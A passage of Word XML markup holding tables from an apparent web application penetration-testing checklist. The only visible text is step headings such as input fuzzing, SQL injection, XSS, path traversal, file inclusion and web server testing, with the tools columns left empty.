            <w:tcW w:w="1560" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0949C9F1" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3200" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6ED4D799" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRPr="005A1C80" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Test for Insecure Methods</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="765FF97F" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="5AF37326" w14:textId="77777777" w:rsidR="00DE1C75" w:rsidRDefault="00DE1C75" w:rsidP="00DE1C75">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="240ECFED" w14:textId="77777777" w:rsidR="00D94C1C" w:rsidRDefault="00D94C1C" w:rsidP="00CD4824">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="674B749D" w14:textId="77777777" w:rsidR="00D94C1C" w:rsidRPr="00ED3CCF" w:rsidRDefault="00D94C1C" w:rsidP="00ED3CCF">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED3CCF">
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Input Handling</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="9497" w:type="dxa"/>
        <w:tblInd w:w="250" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="101"/>
        <w:gridCol w:w="101"/>
        <w:gridCol w:w="1562"/>
        <w:gridCol w:w="3197"/>
        <w:gridCol w:w="3402"/>
        <w:gridCol w:w="1134"/>
      </w:tblGrid>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="08E29890" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1764" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="54C589BE" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Number</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3197" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="39422EA4" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="3B0423A4" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="28D83128" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="0E70F4BD" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1764" w:type="dxa"/>
            <w:gridSpan w:val="3"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7803754C" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>7</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3197" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="37B7CC29" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Test for Input-Based Vulnerabilities</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="21201BEF" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="67DC6DE6" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="24CD3199" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="101" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1663" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="1E69A485" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>7.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3197" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="55D93C16" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Fuzz All Parameters</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="09E2F38F" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="62A66713" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="54A41BE4" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="202" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1562" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6EF4916C" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:bookmarkStart w:id="7" w:name="_Hlk57471749"/>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3197" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="377BCA15" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>SQL Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="23044632" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="7605B956" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="53B72B9C" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="202" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1562" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="36CED936" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3197" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="386FCF39" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>XSS and Response Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="346D990C" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="6B9524F1" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="0E8C29BA" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="202" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1562" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3510D577" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="0018377B" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
              <w:rPr>
                <w:highlight w:val="yellow"/>
              </w:rPr>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3197" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="61DA0F3E" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Path Traversal</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0587B5A3" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="424FE836" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="2E07EFB6" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="202" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1562" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="32296A56" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3197" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="79E12DB2" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRPr="005A1C80" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>Script Injection</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="4EA2F84E" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="5D1C9EE0" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="008571B9" w14:paraId="7EEB340E" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="2"/>
          <w:wBefore w:w="202" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1562" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="0183E805" w14:textId="77777777" w:rsidR="008571B9" w:rsidRDefault="008571B9" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3197" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="3C68C58F" w14:textId="77777777" w:rsidR="008571B9" w:rsidRPr="005A1C80" w:rsidRDefault="008571B9" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r w:rsidRPr="005A1C80">
              <w:t>File Inclusion</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="1A6FCC34" w14:textId="77777777" w:rsidR="008571B9" w:rsidRDefault="008571B9" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="EAEAEA" w:themeFill="text2" w:themeFillTint="1A"/>
          </w:tcPr>
          <w:p w14:paraId="4DF9B03F" w14:textId="77777777" w:rsidR="008571B9" w:rsidRDefault="008571B9" w:rsidP="00546901">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:bookmarkEnd w:id="7"/>
    </w:tbl>
    <w:p w14:paraId="2038EEC1" w14:textId="77777777" w:rsidR="00053516" w:rsidRDefault="00053516" w:rsidP="00CD4824">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="432C2AB8" w14:textId="77777777" w:rsidR="00D94C1C" w:rsidRPr="00ED3CCF" w:rsidRDefault="00D94C1C" w:rsidP="00ED3CCF">
      <w:pPr>
        <w:spacing w:line="320" w:lineRule="atLeast"/>
        <w:jc w:val="center"/>
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00ED3CCF">
        <w:rPr>
          <w:color w:val="0D2B3E" w:themeColor="accent3" w:themeShade="80"/>
          <w:sz w:val="28"/>
          <w:szCs w:val="28"/>
          <w:u w:val="single"/>
        </w:rPr>
        <w:t>Application Hosting</w:t>
      </w:r>
    </w:p>
    <w:tbl>
      <w:tblPr>
        <w:tblStyle w:val="TableGrid"/>
        <w:tblW w:w="9497" w:type="dxa"/>
        <w:tblInd w:w="250" w:type="dxa"/>
        <w:tblLook w:val="04A0" w:firstRow="1" w:lastRow="0" w:firstColumn="1" w:lastColumn="0" w:noHBand="0" w:noVBand="1"/>
      </w:tblPr>
      <w:tblGrid>
        <w:gridCol w:w="102"/>
        <w:gridCol w:w="1650"/>
        <w:gridCol w:w="3209"/>
        <w:gridCol w:w="3402"/>
        <w:gridCol w:w="1134"/>
      </w:tblGrid>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="314E896A" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1752" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="106FAF10" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Number</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3209" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="279BA09A" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Step Description</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="186CF8BB" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Tools</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="274221" w:themeFill="accent4" w:themeFillShade="80"/>
          </w:tcPr>
          <w:p w14:paraId="278EEE09" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="336E8681" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1752" w:type="dxa"/>
            <w:gridSpan w:val="2"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="2CFA7F8D" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="0038049A" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>9</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3209" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="20FC081C" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:r>
              <w:t>Test the web Server</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3402" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="7FCFE360" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1134" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="3A6331" w:themeFill="accent4" w:themeFillShade="BF"/>
          </w:tcPr>
          <w:p w14:paraId="6552C578" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00ED3CCF" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00ED3CCF" w14:paraId="673429B9" w14:textId="77777777" w:rsidTr="00ED3CCF">
        <w:trPr>
          <w:gridBefore w:val="1"/>
          <w:wBefore w:w="102" w:type="dxa"/>
        </w:trPr>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="1650" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
          </w:tcPr>
          <w:p w14:paraId="322ACAA5" w14:textId="77777777" w:rsidR="00ED3CCF" w:rsidRDefault="00961B3E" w:rsidP="00D94C1C">
            <w:pPr>
              <w:spacing w:line="320" w:lineRule="atLeast"/>
            </w:pPr>
            <w:bookmarkStart w:id="8" w:name="_Hlk58091918"/>
            <w:r>
              <w:t>9</w:t>
            </w:r>
            <w:r w:rsidR="00ED3CCF">
              <w:t>.1</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="3209" w:type="dxa"/>
            <w:shd w:val="clear" w:color="auto" w:fill="CBCBCB" w:themeFill="text2" w:themeFillTint="40"/>
